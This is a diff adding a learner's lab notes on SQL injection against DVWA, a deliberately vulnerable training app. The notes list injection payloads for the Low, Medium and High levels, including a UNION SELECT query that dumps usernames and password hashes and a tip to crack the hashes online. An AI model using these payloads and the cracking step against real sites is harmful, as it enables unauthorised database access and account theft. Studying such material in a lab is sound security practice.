@@ -1,0 +1,31 @@
+Directory: localhost/DVWA-master/vulnerabilities/sqli/
+
+# SQLi - Difficulty:Low
+User Id -->
+'or 1=1# 
+'or'1'='1
+'or 1-- -
+' ORDER BY 3#
+' ORDER BY 2# 
+' UNION SELECT user, password FROM users#       (# for commenting the rest of the statements after the query.)
+' UNION SELECT user, password FROM users--
+
+# SQLi - Difficulty:Medium
+inspect--> User Id
+<option value="1 or 1=1 UNION SELECT user, password FROM users#">' UNION SELECT username, password FROM users--1</option>
+
+NB: However due to the SQL query not having **quotes** around the parameter, this will not fully protect the query from being altered.
+    (View Help & Source Code)
+    
+    
+# SQLi - Difficulty:High
+1' or 1=1 UNION SELECT user, password FROM users#
+
+# SQLi - Cracking the Hashes
+Set Setting: Low & collect the hashes.
+' UNION SELECT user, password FROM users#
+Paste it into crackstation.net to get the passwords.
+
+Additional Help: https://portswigger.net/web-security/sql-injection/union-attacks
+
+
